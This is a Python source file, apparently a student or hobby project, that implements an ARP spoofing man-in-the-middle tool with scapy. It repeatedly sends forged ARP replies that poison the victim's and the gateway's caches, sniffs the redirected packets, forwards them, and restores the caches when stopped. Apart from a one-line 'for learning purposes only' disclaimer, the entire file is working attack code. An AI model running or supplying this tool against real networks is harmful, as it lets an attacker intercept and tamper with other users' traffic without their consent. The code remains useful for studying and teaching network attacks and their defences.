"""
created by Yoav Kolet
"""

import time
import threading
import scapy.all as scapy
import SpoofTools
from scapy.all import conf, IP, sniff, sendp, Ether, arping


"""
THIS CODE IS FOR LEARNING PURPOSES ONLY!
"""


class ArpSpoofing:
    def __init__(self, victim_ip: str):
        """
        :param victim_ip: gets the victim (target) ip
        """
        self.ip = scapy.get_if_addr(conf.iface)
        self.my_mac = SpoofTools.get_mac(self.ip)
        self.victim_ip = victim_ip  # Enter your target IP
        self.victim_mac = SpoofTools.get_mac(self.victim_ip)
        self.gateway_ip = conf.route.route("0.0.0.0")[2]
        self.gateway_mac = SpoofTools.get_mac(self.gateway_ip)
        self.running = True
        self.forward = True

        self.handle_t = None
        self.run_spoof_t = None

    def spoof(self, victim_ip, spoof_ip):
        """
        :param victim_ip: the ip address that being spoofed in thr arp cache
        :type victim_ip: str
        :param spoof_ip: the ip address the spoofer use to spoof the arp cache
        :type spoof_ip: str
        """
        packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=SpoofTools.get_mac(victim_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    @staticmethod
    def restore(destination_ip, source_ip):
        """
        :param destination_ip: the ip address that being restored in thr arp cache
        :type destination_ip: str
        :param source_ip: the ip address the spoofer use to restore the arp cache
        :type source_ip: str
        """
        destination_mac = SpoofTools.get_mac(destination_ip)
        source_mac = SpoofTools.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        # packet.show()
        scapy.send(packet, verbose=False)

    def run_spoofer(self):
        try:
            sent_packets_count = 0
            while self.running:
                self.spoof(self.victim_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.victim_ip)
                sent_packets_count = sent_packets_count + 2
                print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                time.sleep(2)  # Waits for two seconds

        except KeyboardInterrupt:
            self.stop_spoof()

    def stop_spoof(self):
        self.running = False
        print("\nCtrl + C pressed.............Exiting")
        self.restore(self.gateway_ip, self.victim_ip)
        self.restore(self.victim_ip, self.gateway_ip)
        print("[+] Arp Spoof Stopped")

    def handle_packets(self):
        """
        sniffs all the ports for packets and filters it with the pack_filter
        """
        while True:
            sniff(iface="‏‏Ethernet", lfilter=self.pack_filter, prn=self.send_packet)

    def pack_filter(self, pkt):
        """
        filters the right packets with the mac addresses
        """
        return Ether in pkt and IP in pkt and \
            ((pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac)
             or
             (pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac))

    def send_packet(self, pkt):
        if not self.forward:
            return
        """
        :param pkt: packet that needs to be rerouted
        """
        if pkt[Ether].src == self.victim_mac and pkt[Ether].dst == self.my_mac and pkt[IP].src == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.gateway_mac

        elif pkt[Ether].src == self.gateway_mac and pkt[Ether].dst == self.my_mac and pkt[IP].dst == self.victim_ip:
            pkt[Ether].src = self.my_mac
            pkt[Ether].dst = self.victim_mac

        # sends a packet on the Ethernet layer
        sendp(pkt, verbose=False)

    def start_spoof(self):
        self.handle_t = threading.Thread(target=self.handle_packets, daemon=True)
        self.handle_t.start()
        self.run_spoof_t = threading.Thread(target=self.run_spoofer, daemon=True)
        self.run_spoof_t.start()
